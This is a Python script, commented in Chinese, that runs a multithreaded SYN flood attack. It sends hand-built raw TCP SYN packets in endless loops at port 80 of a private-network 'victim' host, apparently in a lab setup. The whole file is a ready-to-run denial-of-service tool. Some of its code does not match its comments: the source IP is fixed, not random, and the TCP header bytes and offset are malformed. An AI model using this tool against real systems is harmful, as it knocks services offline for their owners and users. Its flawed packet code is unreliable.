import socket
import random
import threading
import struct  # 导入struct模块用于数据打包

# 目标主机：h1（受害者服务器）
TARGET_IP = "192.168.1.100"
TARGET_PORT = 80  # 攻击目标端口（HTTP服务端口）
THREAD_COUNT = 5  # 攻击线程数量

def syn_flood():
    """发送大量伪造的TCP SYN包，造成SYN Flood攻击"""
    try:
        # 创建原始socket（需要root权限）
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except PermissionError:
        print("❌ 请使用root权限运行脚本：sudo python3 syn_flood.py")
        return
    except Exception as e:
        print(f"❌ 创建socket失败：{str(e)}")
        return

    while True:
        # 伪造随机源IP（同网段内的虚假IP）
        src_ip = f"192.168.1.2"
        src_port = random.randint(1024, 65535)  # 随机源端口

        # 构造IP头部（简化版）
        ip_header = b"\x45\x00\x00\x28"  # IP版本(4) + 头部长度(5) + 服务类型 + 总长度
        ip_header += b"\x00\x00\x00\x00"  # 标识 + 标志 + 片偏移
        ip_header += b"\x40\x06\x00\x00"  # TTL(64) + 协议(TCP=6) + 校验和(0=自动计算)
        ip_header += socket.inet_aton(src_ip)  # 源IP
        ip_header += socket.inet_aton(TARGET_IP)  # 目标IP

        # 构造TCP头部（仅包含SYN标志位）
        # 关键修复：将socket.pack改为struct.pack
        tcp_header = struct.pack("!H", src_port)  # 源端口
        tcp_header += struct.pack("!H", TARGET_PORT)  # 目标端口
        tcp_header += b"\x00\x00\x00\x00"  # 序列号
        tcp_header += b"\x00\x00\x00\x00"  # 确认号
        tcp_header += b"\x50\x02\x7fff"  # 数据偏移(8) + 保留位 + SYN标志位 + 窗口大小
        tcp_header += b"\x00\x00\x00\x00"  # 校验和 + 紧急指针

        try:
            # 发送SYN包
            sock.sendto(ip_header + tcp_header, (TARGET_IP, TARGET_PORT))
            # 每发送1000个包打印一次状态（避免输出刷屏）
            if random.randint(1, 1000) == 500:
                print(f"📊 已发送大量SYN包：{src_ip}:{src_port} → {TARGET_IP}:{TARGET_PORT}")
        except Exception as e:
            print(f"❌ 发送数据包失败：{str(e)}")
            break

if __name__ == "__main__":
    print(f"🚀 开始SYN Flood攻击，目标：{TARGET_IP}:{TARGET_PORT}")
    print(f"ℹ️  按Ctrl+C停止攻击")
    
    # 启动多线程攻击
    for _ in range(THREAD_COUNT):
        thread = threading.Thread(target=syn_flood)
        thread.daemon = True  # 主线程退出时子线程自动结束
        thread.start()
    
    # 保持主线程运行
    try:
        while True:
            threading.Event().wait(1)
    except KeyboardInterrupt:
        print("\n🛑 攻击已停止")

